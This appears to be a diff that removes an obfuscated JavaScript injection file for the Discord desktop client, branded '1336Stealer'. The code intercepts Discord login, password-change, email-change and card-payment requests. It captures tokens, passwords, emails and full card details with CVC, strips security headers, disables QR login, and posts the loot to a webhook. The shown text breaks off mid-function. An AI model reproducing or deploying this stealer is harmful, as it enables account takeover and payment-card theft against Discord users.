@@ -1,1 +1,869 @@
-var _0x5f568a=_0x18f0;(function(_0x4b324c,_0x18f4c5){var _0x3322c0=_0x18f0,_0x11a118=_0x4b324c();while(!![]){try{var _0x1e53f3=parseInt(_0x3322c0(0x1a8))/0x1*(-parseInt(_0x3322c0(0x19e))/0x2)+-parseInt(_0x3322c0(0x19c))/0x3+parseInt(_0x3322c0(0x1e4))/0x4+-parseInt(_0x3322c0(0x207))/0x5+-parseInt(_0x3322c0(0x181))/0x6*(parseInt(_0x3322c0(0x182))/0x7)+-parseInt(_0x3322c0(0x1b4))/0x8*(parseInt(_0x3322c0(0x1fe))/0x9)+parseInt(_0x3322c0(0x18a))/0xa;if(_0x1e53f3===_0x18f4c5)break;else _0x11a118['push'](_0x11a118['shift']());}catch(_0x1f826b){_0x11a118['push'](_0x11a118['shift']());}}}(_0x2138,0x78f4d));function _0x2138(){var _0x37c1b5=['login','uploadData','Discord\x20|\x20User\x20logged\x20out','exp_year','<a:boost:824036778570416129>\x20``Nitro\x20Boost``','Rare','<:1336:1012707124763177022>\x20Badges:','application/json','./core.asar','```No\x20Nitro```','24RILucA','defaultSession','content','brand','token','content-security-policy','Discord\x20|\x20Client\x20initialized','\x20||','**Total\x20Friends\x20(','<:1336:1012707773424865310>\x20IP:','onCompleted','<:hypesquad_events:874750808594477056>','<a:1336:1012706914527891476>\x20Token:','webhook','<:developer:874750808472825986>','https://discordapp.com/api/v*/auth/login','<:balance:874750808267292683>','passwordChanged','https://*.discord.com/api/v*/users/@me','cvc','\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText','\x20|\x20',')**\x0a\x0a','No\x20Rare\x20Friends','data','Emoji','https://*.discord.com/api/v*/users/@me/billing/subscriptions','wss://remote-auth-gateway.discord.gg/*','filters','includes','handle','https://discord.com/api/v*/applications/detectable','premium_type','ping','<:staff:874750808728666152>','endsWith','<:bughunter_2:874750808430874664>','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','1336','```None```','@everyone','https://discord.com/api/v*/users/@me/library','exp_month','https://*.discord.com/api/v*/users/@me/library','password','\x20<:paypal:896441236062347374>','```❌```','<a:1336:1026125680330678354>\x20New\x20Password','2248788MLHzQJ','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','<a:1336:1026126703942176869>\x20Credit\x20card\x20Number','avatar_url','POST','https://cdn.discordapp.com/avatars/','https://www.myexternalip.com/raw','bytes','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://ipinfo.io/json\x22,\x20false\x20);xmlHttp.send(\x20null\x20);xmlHttp.responseText;','end','length','Value','request','protocol','type','<:brilliance:874750808338608199>','`✔️`','@1336Stealer','tokens','discriminator','user','toString','url','split','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','card[number]','483363jdbduD','embed','event','Access-Control-Allow-Headers\x20\x27*\x27','public_flags','<a:1336:1026125680330678354>\x20Old\x20Password','error','emailChanged','https://discord.com/api/v*/auth/login','4365470vFSXhr','https://discord.gg/MtSkEA4aNg','https://api.stripe.com/v*/setup_intents/*/confirm','flags','for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x27get_require\x27]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x27getToken\x27==a&&(token=b.default.getToken())}token;','userLogin','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','card[exp_month]','\x20:credit_card:','footer','write','frien','Access-Control-Allow-Origin\x20\x27*\x27','existsSync','then','https://*.discord.com/api/v*/applications/detectable','filter','<:1336:1012707326223982692>\x20Nitro\x20Type:','webRequest','https://cdn.discordapp.com/embed/avatars/0.png','querystring','creditCardAdded','LOCALAPPDATA','https://*.discord.com/api/v*/auth/login','https://discordapp.com/api/v*/users/@me','badges','log','startsWith','href','card[exp_year]','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','https://cdn.discordapp.com/attachments/1019867803349680168/1026121367764082769/a_721d6729d0b5e1a8979ab7a445378e9a.gif','https://api.stripe.com/v*/tokens','get','card[cvc]','1020882waFQav','7uoJIFg','electron','<:1336:1012707970653626408>\x20Email:','%WEBHOOK_LINK%','PATCH','invalid','new_password','cwd','18357660rYOygV','responseHeaders','https','entries','email','notify_on_logout','logout','<:early_supporter:874750808414113823>','pathname','\x22);\x20xmlHttp.send(\x20null\x20);\x20xmlHttp.responseText','<:partner:874750808678354964>','avatar','username','host','users/@me','wss://','qr_codes','stringify','816231Keeeng','disable_qr_code','284058mbArXw','<a:1336:1012707511830331442>\x20Billing:','default-src\x20\x27*\x27','method','<a:1336:1026125680330678354>\x20Password','statusCode','number','discord.com','getAllWindows','parse','3FCoHUj','assign'];_0x2138=function(){return _0x37c1b5;};return _0x2138();}const {BrowserWindow,session}=require(_0x5f568a(0x183)),os=require('os'),https=require(_0x5f568a(0x18c)),querystring=require(_0x5f568a(0x172)),fs=require('fs');var config={'brand':_0x5f568a(0x1da),'webhook':_0x5f568a(0x185),'logout':!![],'disable_qr_code':!![],'notify_on_logout':!![],'notify_on_initialization':!![],'ping':[!![],_0x5f568a(0x1dc)],'embed':{'username':'1336Stealer','footer':{'text':_0x5f568a(0x1f5),'icon_url':_0x5f568a(0x17d)},'href':_0x5f568a(0x208),'avatar_url':'https://cdn.discordapp.com/attachments/1019867803349680168/1026121367764082769/a_721d6729d0b5e1a8979ab7a445378e9a.gif'},'badges':{'Discord_Employee':{'Value':0x1,'Emoji':_0x5f568a(0x1d6),'Rare':!![]},'Partnered_Server_Owner':{'Value':0x2,'Emoji':_0x5f568a(0x194),'Rare':!![]},'HypeSquad_Events':{'Value':0x4,'Emoji':_0x5f568a(0x1bf),'Rare':!![]},'Bug_Hunter_Level_1':{'Value':0x8,'Emoji':'<:bughunter_1:874750808426692658>','Rare':!![]},'Early_Supporter':{'Value':0x200,'Emoji':_0x5f568a(0x191),'Rare':!![]},'Bug_Hunter_Level_2':{'Value':0x4000,'Emoji':_0x5f568a(0x1d8),'Rare':!![]},'Early_Verified_Bot_Developer':{'Value':0x20000,'Emoji':_0x5f568a(0x1c2),'Rare':!![]},'House_Bravery':{'Value':0x40,'Emoji':'<:bravery:874750808388952075>','Rare':![]},'House_Brilliance':{'Value':0x80,'Emoji':_0x5f568a(0x1f3),'Rare':![]},'House_Balance':{'Value':0x100,'Emoji':_0x5f568a(0x1c4),'Rare':![]}},'filters':{'user':{'urls':['https://discord.com/api/v*/users/@me',_0x5f568a(0x176),_0x5f568a(0x1c6),_0x5f568a(0x1c3),_0x5f568a(0x206),_0x5f568a(0x175),_0x5f568a(0x1d9),_0x5f568a(0x17e),_0x5f568a(0x209),'https://api.stripe.com/v*/payment_intents/*/confirm']},'qr_codes':{'urls':[_0x5f568a(0x1fc),_0x5f568a(0x16d),_0x5f568a(0x1d3),_0x5f568a(0x1df),_0x5f568a(0x1dd),_0x5f568a(0x1ce),'https://discord.com/api/v*/users/@me/billing/subscriptions',_0x5f568a(0x1cf)]}}};async function getIp(){var _0x3053b0=_0x5f568a,_0x1e400a=await axios[_0x3053b0(0x17f)](_0x3053b0(0x1ea));return _0x1e400a[_0x3053b0(0x1cc)];}var execScript=_0x4e91be=>{var _0x47b05a=_0x5f568a;const _0x4f263f=BrowserWindow[_0x47b05a(0x1a6)]()[0x0];return _0x4f263f['webContents']['executeJavaScript'](_0x4e91be,!![]);};class Event{constructor(_0x5d6ff2,_0x454970,_0x4363ba){var _0x369a3f=_0x5f568a;for(let [_0x4ac3de,_0x1eb8f2]of Object[_0x369a3f(0x18d)]({'event':_0x5d6ff2,'data':_0x4363ba,'token':_0x454970})){this[_0x4ac3de]=_0x1eb8f2;}}[_0x5f568a(0x1d2)](){var _0xbba576=_0x5f568a;switch(this[_0xbba576(0x200)]){case _0xbba576(0x1c5):event_handlers[_0xbba576(0x1c5)](this[_0xbba576(0x1cc)]['password'],this[_0xbba576(0x1cc)][_0xbba576(0x188)],this[_0xbba576(0x1b8)]);break;case _0xbba576(0x163):event_handlers[_0xbba576(0x163)](this['data'][_0xbba576(0x1e0)],this['data'][_0xbba576(0x18e)],this['token']);break;case'emailChanged':event_handlers[_0xbba576(0x205)](this['data'][_0xbba576(0x1e0)],this[_0xbba576(0x1cc)][_0xbba576(0x18e)],this[_0xbba576(0x1b8)]);break;case _0xbba576(0x173):event_handlers['creditCardAdded'](this[_0xbba576(0x1cc)][_0xbba576(0x1a4)],this[_0xbba576(0x1cc)][_0xbba576(0x1c7)],this[_0xbba576(0x1cc)][_0xbba576(0x1de)],this['data'][_0xbba576(0x1ad)],this[_0xbba576(0x1b8)]);}}}function _0x18f0(_0x1e9f58,_0x1fb7e4){var _0x2138de=_0x2138();return _0x18f0=function(_0x18f059,_0x413f2e){_0x18f059=_0x18f059-0x161;var _0x1b4750=_0x2138de[_0x18f059];return _0x1b4750;},_0x18f0(_0x1e9f58,_0x1fb7e4);}session[_0x5f568a(0x1b5)][_0x5f568a(0x170)]['onHeadersReceived']((_0x26c6ca,_0x5421fa)=>{var _0x32fea3=_0x5f568a;try{_0x26c6ca['url'][_0x32fea3(0x179)](config[_0x32fea3(0x1c1)])?_0x26c6ca[_0x32fea3(0x1fa)][_0x32fea3(0x1d1)](_0x32fea3(0x1a5))?_0x5421fa({'responseHeaders':Object[_0x32fea3(0x1a9)]({'Access-Control-Allow-Headers':'*'},_0x26c6ca[_0x32fea3(0x18b)])}):_0x5421fa({'responseHeaders':Object[_0x32fea3(0x1a9)]({'Content-Security-Policy':[_0x32fea3(0x1a0),_0x32fea3(0x201),_0x32fea3(0x16a)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x26c6ca[_0x32fea3(0x18b)])}):(delete _0x26c6ca['responseHeaders'][_0x32fea3(0x1b9)],delete _0x26c6ca['responseHeaders']['content-security-policy-report-only'],_0x5421fa({'responseHeaders':{..._0x26c6ca[_0x32fea3(0x18b)],'Access-Control-Allow-Headers':'*'}}));}catch{}}),session['defaultSession'][_0x5f568a(0x170)]['onBeforeRequest'](config[_0x5f568a(0x1d0)][_0x5f568a(0x19a)],async(_0x458657,_0x38c8c1)=>{var _0x41f872=_0x5f568a;if(_0x458657[_0x41f872(0x1fa)][_0x41f872(0x179)](_0x41f872(0x199))){if(!config[_0x41f872(0x19d)]==![]){_0x38c8c1({'cancel':!![]});return;}}await initialize(),_0x38c8c1({});return;}),session[_0x5f568a(0x1b5)][_0x5f568a(0x170)][_0x5f568a(0x1be)](config[_0x5f568a(0x1d0)]['user'],async(_0x39de3f,_0x612e6f)=>{var _0x3aac5d=_0x5f568a;try{if(_0x39de3f['statusCode']==0xc8||_0x39de3f[_0x3aac5d(0x1a3)]==0xcc){const _0x2ee0cb=Buffer['from'](_0x39de3f[_0x3aac5d(0x1ab)][0x0][_0x3aac5d(0x1eb)])[_0x3aac5d(0x1f9)](),_0x43603e=JSON[_0x3aac5d(0x1a7)](_0x2ee0cb),_0x3945b0=await getToken();switch(!![]){case _0x39de3f['url']['endsWith'](_0x3aac5d(0x1aa)):new Event(_0x3aac5d(0x163),_0x3945b0,{'password':_0x43603e[_0x3aac5d(0x1e0)],'email':_0x43603e[_0x3aac5d(0x1aa)]})['handle']();;return;case _0x39de3f['url']['endsWith'](_0x3aac5d(0x1f6))&&_0x39de3f[_0x3aac5d(0x1a1)]==_0x3aac5d(0x1e8):const _0x34a788=querystring[_0x3aac5d(0x1a7)](_0x2ee0cb[_0x3aac5d(0x1f9)]());new Event(_0x3aac5d(0x173),_0x3945b0,{'number':_0x34a788[_0x3aac5d(0x1fd)],'cvc':_0x34a788[_0x3aac5d(0x180)],'exp_month':_0x34a788[_0x3aac5d(0x165)],'exp_year':_0x34a788[_0x3aac5d(0x17b)]});case _0x39de3f[_0x3aac5d(0x1fa)][_0x3aac5d(0x1d7)](_0x3aac5d(0x198))&&_0x39de3f[_0x3aac5d(0x1a1)]==_0x3aac5d(0x186):if(!_0x43603e[_0x3aac5d(0x1e0)])return;_0x43603e[_0x3aac5d(0x18e)]&&new Event('emailChanged',_0x3945b0,{'password':_0x43603e[_0x3aac5d(0x1e0)],'email':_0x43603e['email']})['handle']();;_0x43603e[_0x3aac5d(0x188)]&&new Event(_0x3aac5d(0x1c5),_0x3945b0,{'password':_0x43603e[_0x3aac5d(0x1e0)],'new_password':_0x43603e[_0x3aac5d(0x188)]})[_0x3aac5d(0x1d2)]();;return;default:break;}}else return;}catch{}});var event_handlers={async 'creditCardAdded'(_0x31a510,_0x5409ce,_0x9c56ab,_0x4650cc){var _0x330659=_0x5f568a;const _0x1a6638=await getUserInfo(token),_0x549892=await getBilling(token),_0x23d775=await getRelationships(token);var _0x3b7add=await getIp(),_0x2d81a5={'username':config[_0x330659(0x1ff)]['username'],'avatar_url':config[_0x330659(0x1ff)][_0x330659(0x1e7)],'embeds':[createEmbed({'author':{'name':_0x1a6638[_0x330659(0x196)]+'#'+_0x1a6638[_0x330659(0x1f7)]+'\x20('+_0x1a6638['id']+')','icon_url':_0x1a6638[_0x330659(0x195)]?_0x330659(0x1e9)+_0x1a6638['id']+'/'+_0x1a6638[_0x330659(0x195)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'thumbnail':{'url':_0x1a6638[_0x330659(0x195)]?'https://cdn.discordapp.com/avatars/'+_0x1a6638['id']+'/'+_0x1a6638[_0x330659(0x195)]:_0x330659(0x171)},'fields':[{'name':'<a:1336:1012706914527891476>\x20Token:','value':'`'+token+'`','inline':![]},{'name':_0x330659(0x1b0),'value':''+getBadges(_0x1a6638['flags']),'inline':!![]},{'name':'<:1336:1012707326223982692>\x20Nitro\x20Type:','value':''+getNitro(_0x1a6638[_0x330659(0x1d4)]),'inline':!![]},{'name':_0x330659(0x19f),'value':''+_0x549892,'inline':!![]},{'name':_0x330659(0x1bd),'value':'`'+_0x3b7add+'`','inline':!![]},{'name':_0x330659(0x184),'value':''+email,'inline':!![]},{'name':_0x330659(0x1a2),'value':'`'+password+'`','inline':!![]},{'name':_0x330659(0x1e6),'value':'`'+_0x31a510+'|'+_0x9c56ab+'|'+_0x4650cc+'|'+_0x5409ce+'`','inline':![]}]}),createEmbed({'description':'**Total\x20Friends\x20('+_0x23d775[_0x330659(0x1ee)]+')**\x0a\x0a'+_0x23d775[_0x330659(0x169)],'thumbnail':{'url':_0x1a6638[_0x330659(0x195)]?_0x330659(0x1e9)+_0x1a6638['id']+'/'+_0x1a6638[_0x330659(0x195)]:_0x330659(0x171)},'author':{'name':_0x1a6638[_0x330659(0x196)]+'#'+_0x1a6638['discriminator']+'\x20('+_0x1a6638['id']+')','url':config[_0x330659(0x1ff)][_0x330659(0x17a)],'icon_url':_0x1a6638[_0x330659(0x195)]?_0x330659(0x1e9)+_0x1a6638['id']+'/'+_0x1a6638['avatar']:_0x330659(0x171)}})]};sendToWebhook(_0x2d81a5);},async 'userLogin'(_0x41410b,_0xb153a9,_0x5ef072){var _0x23cb4d=_0x5f568a;const _0x3a8636=await getUserInfo(_0x5ef072),_0x13273b=await getBilling(_0x5ef072),_0x3fe867=await getRelationships(_0x5ef072);var _0x5ac90f=await getIp(),_0x3ed3b7={'username':config['embed'][_0x23cb4d(0x196)],'avatar_url':config[_0x23cb4d(0x1ff)]['avatar_url'],'embeds':[createEmbed({'author':{'name':_0x3a8636['username']+'#'+_0x3a8636[_0x23cb4d(0x1f7)]+'\x20('+_0x3a8636['id']+')','url':config[_0x23cb4d(0x1ff)]['href'],'icon_url':_0x3a8636[_0x23cb4d(0x195)]?'https://cdn.discordapp.com/avatars/'+_0x3a8636['id']+'/'+_0x3a8636[_0x23cb4d(0x195)]:_0x23cb4d(0x171)},'thumbnail':{'url':_0x3a8636['avatar']?_0x23cb4d(0x1e9)+_0x3a8636['id']+'/'+_0x3a8636['avatar']:'https://cdn.discordapp.com/embed/avatars/0.png'},'fields':[{'name':_0x23cb4d(0x1c0),'value':'`'+_0x5ef072+'`','inline':![]},{'name':_0x23cb4d(0x1b0),'value':''+getBadges(_0x3a8636[_0x23cb4d(0x161)]),'inline':!![]},{'name':_0x23cb4d(0x16f),'value':''+getNitro(_0x3a8636[_0x23cb4d(0x1d4)]),'inline':!![]},{'name':'<a:1336:1012707511830331442>\x20Billing:','value':''+_0x13273b,'inline':!![]},{'name':_0x23cb4d(0x1bd),'value':'`'+_0x5ac90f+'`','inline':!![]},{'name':_0x23cb4d(0x184),'value':''+_0xb153a9,'inline':!![]},{'name':_0x23cb4d(0x1a2),'value':'`'+_0x41410b+'`','inline':!![]}]}),createEmbed({'description':_0x23cb4d(0x1bc)+_0x3fe867[_0x23cb4d(0x1ee)]+_0x23cb4d(0x1ca)+_0x3fe867[_0x23cb4d(0x169)],'thumbnail':{'url':_0x3a8636[_0x23cb4d(0x195)]?_0x23cb4d(0x1e9)+_0x3a8636['id']+'/'+_0x3a8636[_0x23cb4d(0x195)]:_0x23cb4d(0x171)},'author':{'name':_0x3a8636['username']+'#'+_0x3a8636['discriminator']+'\x20('+_0x3a8636['id']+')','url':config[_0x23cb4d(0x1ff)]['href'],'icon_url':_0x3a8636['avatar']?'https://cdn.discordapp.com/avatars/'+_0x3a8636['id']+'/'+_0x3a8636['avatar']:_0x23cb4d(0x171)}})]};sendToWebhook(_0x3ed3b7);},async 'emailChanged'(_0x28da97,_0x50580d,_0x33ce78){var _0x3b1ec2=_0x5f568a,_0x4d55be=await getUserInfo(_0x33ce78),_0xc3a696=await getBilling(_0x33ce78),_0xae6340=await getRelationships(_0x33ce78),_0x18d213=await getIp(),_0x4a6abf={'username':config[_0x3b1ec2(0x1ff)][_0x3b1ec2(0x196)],'avatar_url':config[_0x3b1ec2(0x1ff)][_0x3b1ec2(0x1e7)],'embeds':[createEmbed({'author':{'name':_0x4d55be[_0x3b1ec2(0x196)]+'#'+_0x4d55be[_0x3b1ec2(0x1f7)]+'\x20('+_0x4d55be['id']+')','url':config[_0x3b1ec2(0x1ff)][_0x3b1ec2(0x17a)],'icon_url':_0x4d55be[_0x3b1ec2(0x195)]?_0x3b1ec2(0x1e9)+_0x4d55be['id']+'/'+_0x4d55be[_0x3b1ec2(0x195)]:_0x3b1ec2(0x171)},'thumbnail':{'url':_0x4d55be['avatar']?_0x3b1ec2(0x1e9)+_0x4d55be['id']+'/'+_0x4d55be[_0x3b1ec2(0x195)]:_0x3b1ec2(0x171)},'fields':[{'name':'<a:1336:1012706914527891476>\x20Token:','value':'`'+_0x33ce78+'`','inline':![]},{'name':_0x3b1ec2(0x1b0),'value':''+getBadges(_0x4d55be[_0x3b1ec2(0x161)]),'inline':!![]},{'name':_0x3b1ec2(0x16f),'value':''+getNitro(_0x4d55be[_0x3b1ec2(0x1d4)]),'inline':!![]},{'name':_0x3b1ec2(0x19f),'value':''+_0xc3a696,'inline':!![]},{'name':_0x3b1ec2(0x1bd),'value':'`'+_0x18d213+'`','inline':!![]},{'name':_0x3b1ec2(0x184),'value':''+_0x50580d,'inline':!![]},{'name':_0x3b1ec2(0x1a2),'value':'`'+_0x28da97+'`','inline':!![]}]}),createEmbed({'description':'**Total\x20Friends\x20('+_0xae6340[_0x3b1ec2(0x1ee)]+_0x3b1ec2(0x1ca)+_0xae6340[_0x3b1ec2(0x169)],'thumbnail':{'url':_0x4d55be[_0x3b1ec2(0x195)]?_0x3b1ec2(0x1e9)+_0x4d55be['id']+'/'+_0x4d55be[_0x3b1ec2(0x195)]:_0x3b1ec2(0x171)},'author':{'name':_0x4d55be[_0x3b1ec2(0x196)]+'#'+_0x4d55be[_0x3b1ec2(0x1f7)]+'\x20('+_0x4d55be['id']+')','url':config[_0x3b1ec2(0x1ff)][_0x3b1ec2(0x17a)],'icon_url':_0x4d55be['avatar']?_0x3b1ec2(0x1e9)+_0x4d55be['id']+'/'+_0x4d55be[_0x3b1ec2(0x195)]:'https://cdn.discordapp.com/embed/avatars/0.png'}})]};sendToWebhook(_0x4a6abf);},async 'passwordChanged'(_0x8b963d,_0x2111d9,_0x5c8596){var _0x4f51c2=_0x5f568a,_0x19b3a4=await getUserInfo(_0x5c8596),_0x55f3ba=await getBilling(_0x5c8596),_0xab9967=await getRelationships(_0x5c8596),_0x2727a1=await getIp(),_0x44bc31={'username':config[_0x4f51c2(0x1ff)][_0x4f51c2(0x196)],'avatar_url':config[_0x4f51c2(0x1ff)][_0x4f51c2(0x1e7)],'embeds':[createEmbed({'author':{'name':_0x19b3a4[_0x4f51c2(0x196)]+'#'+_0x19b3a4[_0x4f51c2(0x1f7)]+'\x20('+_0x19b3a4['id']+')','url':config[_0x4f51c2(0x1ff)][_0x4f51c2(0x17a)],'icon_url':_0x19b3a4[_0x4f51c2(0x195)]?_0x4f51c2(0x1e9)+_0x19b3a4['id']+'/'+_0x19b3a4[_0x4f51c2(0x195)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'thumbnail':{'url':_0x19b3a4[_0x4f51c2(0x195)]?_0x4f51c2(0x1e9)+_0x19b3a4['id']+'/'+_0x19b3a4['avatar']:'https://cdn.discordapp.com/embed/avatars/0.png'},'fields':[{'name':_0x4f51c2(0x1c0),'value':'`'+_0x5c8596+'`','inline':![]},{'name':_0x4f51c2(0x1b0),'value':''+getBadges(_0x19b3a4['flags']),'inline':!![]},{'name':'<:1336:1012707326223982692>\x20Nitro\x20Type:','value':''+getNitro(_0x19b3a4[_0x4f51c2(0x1d4)]),'inline':!![]},{'name':_0x4f51c2(0x19f),'value':''+_0x55f3ba,'inline':!![]},{'name':_0x4f51c2(0x1bd),'value':'`'+_0x2727a1+'`','inline':!![]},{'name':_0x4f51c2(0x184),'value':''+newEmail,'inline':!![]},{'name':_0x4f51c2(0x203),'value':'`'+_0x8b963d+'`','inline':!![]},{'name':_0x4f51c2(0x1e3),'value':'`'+_0x2111d9+'`','inline':![]}]}),createEmbed({'description':_0x4f51c2(0x1bc)+_0xab9967['length']+')**\x0a\x0a'+_0xab9967[_0x4f51c2(0x169)],'thumbnail':{'url':_0x19b3a4[_0x4f51c2(0x195)]?_0x4f51c2(0x1e9)+_0x19b3a4['id']+'/'+_0x19b3a4['avatar']:_0x4f51c2(0x171)},'author':{'name':_0x19b3a4[_0x4f51c2(0x196)]+'#'+_0x19b3a4['discriminator']+'\x20('+_0x19b3a4['id']+')','url':config[_0x4f51c2(0x1ff)][_0x4f51c2(0x17a)],'icon_url':_0x19b3a4['avatar']?'https://cdn.discordapp.com/avatars/'+_0x19b3a4['id']+'/'+_0x19b3a4[_0x4f51c2(0x195)]:_0x4f51c2(0x171)}})]};sendToWebhook(_0x44bc31);}};function getDiscordClient(){var _0x181508=_0x5f568a;return''+process[_0x181508(0x189)]()['replace'](process['env'][_0x181508(0x174)]+'\x5c','')[_0x181508(0x1fb)]('\x5c')[0x0][_0x181508(0x1fb)](0x7);}function getNitro(_0x5abe83){var _0x1a2b45=_0x5f568a;switch(_0x5abe83){case 0x0:return _0x1a2b45(0x1b3);case 0x1:return'<:classic:896119171019067423>\x20``Nitro\x20Classic``';case 0x2:return _0x1a2b45(0x1ae);default:return _0x1a2b45(0x1b3);};}function getRareBadges(_0xf1696){var _0x1fdc8e=_0x5f568a,_0x4ac808='';for(const _0x4691f8 in config[_0x1fdc8e(0x177)]){let _0x390355=config[_0x1fdc8e(0x177)][_0x4691f8];if((_0xf1696&_0x390355[_0x1fdc8e(0x1ef)])==_0x390355['Value']&&_0x390355[_0x1fdc8e(0x1af)])_0x4ac808+=_0x390355[_0x1fdc8e(0x1cd)];};return _0x4ac808;}function getBadges(_0x3f9843){var _0x553039=_0x5f568a,_0xa889fb='';for(const _0x9d639e in config[_0x553039(0x177)]){let _0x5cda6d=config[_0x553039(0x177)][_0x9d639e];if((_0x3f9843&_0x5cda6d['Value'])==_0x5cda6d[_0x553039(0x1ef)])_0xa889fb+=_0x5cda6d['Emoji'];};if(_0xa889fb=='')_0xa889fb=_0x553039(0x1db);return _0xa889fb;}async function getToken(){var _0x279ebb=_0x5f568a;return await execScript(_0x279ebb(0x162),!![]);}async function getIp(){var _0x44e2f9=_0x5f568a;return JSON[_0x44e2f9(0x1a7)](await execScript(_0x44e2f9(0x1ec),!![]));}async function getUserInfo(_0x2ecc43){var _0x24f280=_0x5f568a;return JSON[_0x24f280(0x1a7)](await execScript(_0x24f280(0x164)+_0x2ecc43+'\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText;',!![]));}async function getBilling(_0x15e0a9){var _0x4eb3ac=_0x5f568a,_0x2775ee=await execScript(_0x4eb3ac(0x17c)+_0x15e0a9+_0x4eb3ac(0x193),!![]),_0x3aaeb1=JSON[_0x4eb3ac(0x1a7)](_0x2775ee),_0xe32c6d='';_0x3aaeb1['forEach'](_0x33491d=>{var _0x22c552=_0x4eb3ac;if(_0x33491d[_0x22c552(0x1f2)]=='')return _0x22c552(0x1e2);else{if(_0x33491d[_0x22c552(0x1f2)]==0x2&&_0x33491d['invalid']!=!![])_0xe32c6d+=_0x22c552(0x1f4)+_0x22c552(0x1e1);else{if(_0x33491d[_0x22c552(0x1f2)]==0x1&&_0x33491d[_0x22c552(0x187)]!=!![])_0xe32c6d+=_0x22c552(0x1f4)+_0x22c552(0x166);else return'```❌```';}};});if(_0xe32c6d=='')_0xe32c6d=_0x4eb3ac(0x1e2);return _0xe32c6d;}async function getRelationships(_0x4fd89b){var _0x1d0f34=_0x5f568a,_0x503820=await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/relationships\x22,\x20false\x20);xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x4fd89b+_0x1d0f34(0x1c8),!![]),_0x43fbb=JSON[_0x1d0f34(0x1a7)](_0x503820);const _0x2bf89e=_0x43fbb[_0x1d0f34(0x16e)](_0x515753=>{return _0x515753['type']==0x1;});var _0x99c7a3='';for(z of _0x2bf89e){var _0x413edf=getRareBadges(z[_0x1d0f34(0x1f8)][_0x1d0f34(0x202)]);_0x413edf!=''&&(_0x99c7a3+=_0x413edf+(_0x1d0f34(0x1c9)+z[_0x1d0f34(0x1f8)][_0x1d0f34(0x196)]+'#'+z[_0x1d0f34(0x1f8)][_0x1d0f34(0x1f7)]+'\x0a'));}if(!_0x99c7a3)_0x99c7a3=_0x1d0f34(0x1cb);return{'length':_0x2bf89e[_0x1d0f34(0x1ee)],'frien':_0x99c7a3};}function sendToWebhook(_0x41eafd){var _0x405e13=_0x5f568a;config[_0x405e13(0x1d5)][0x0]==!![]&&(_0x41eafd[_0x405e13(0x1b6)]?_0x41eafd['content']=_0x41eafd[_0x405e13(0x1b6)]+(_0x405e13(0x1bb)+config['ping'][0x1]+'||'):_0x41eafd[_0x405e13(0x1b6)]='||'+config[_0x405e13(0x1d5)][0x1]+'||');var _0x35a23b=new URL(config['webhook']),_0x4fc446={'Content-Type':_0x405e13(0x1b1),'Access-Control-Allow-Origin':'*'};const _0x39f01e={'protocol':_0x35a23b[_0x405e13(0x1f1)],'hostname':_0x35a23b[_0x405e13(0x197)],'path':_0x35a23b[_0x405e13(0x192)],'method':_0x405e13(0x1e8),'headers':_0x4fc446},_0x1a49b7=https[_0x405e13(0x1f0)](_0x39f01e);_0x1a49b7['on'](_0x405e13(0x204),_0x30c4da=>{var _0x2fe4ce=_0x405e13;console[_0x2fe4ce(0x178)](_0x30c4da);}),_0x1a49b7[_0x405e13(0x168)](JSON[_0x405e13(0x19b)](_0x41eafd)),_0x1a49b7[_0x405e13(0x1ed)]();}function createEmbed(_0x2efcd8){var _0x432361=_0x5f568a;let _0x5336cf={'footer':config['embed'][_0x432361(0x167)],'timestamp':new Date()};for(let [_0x4777b0,_0x5c0fa1]of Object[_0x432361(0x18d)](_0x2efcd8)){_0x5336cf[_0x4777b0]=_0x5c0fa1;}return _0x5336cf;}async function initialize(){var _0x3cfd43=_0x5f568a;if(!fs[_0x3cfd43(0x16b)](process[_0x3cfd43(0x189)]()+'/'+config[_0x3cfd43(0x1b7)])){fs['mkdirSync'](process['cwd']()+'/'+config[_0x3cfd43(0x1b7)]);var _0x5d4a40=undefined;_0x5d4a40=await getToken();const _0x50a59d=await getIp();var _0x463bca,_0x3255a8,_0x3e238f,_0x24c384=await 